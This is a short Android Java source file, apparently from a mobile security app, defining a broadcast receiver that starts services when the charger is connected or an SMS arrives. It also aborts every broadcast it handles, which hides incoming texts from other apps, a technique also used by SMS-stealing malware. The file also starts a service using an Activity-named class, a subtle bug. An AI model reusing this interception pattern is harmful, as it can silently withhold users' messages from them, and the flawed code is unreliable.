package com.caliente.mobilsecurit;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class SmsSchemeReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
	    // TODO Auto-generated method stub
		System.out.println("CHARGEUR_GOGOGO:"+intent.getAction());
		
		if(intent.getAction().contains(Intent.ACTION_POWER_CONNECTED))
			context.startService(intent.setClass(context, SmsSchemeActivity.class));
		
		if(intent.getAction().contains("SMS_RECEIVED"))
			context.startService(intent.setClass(context, SmsReceiveService.class));
		
		abortBroadcast();
	}
}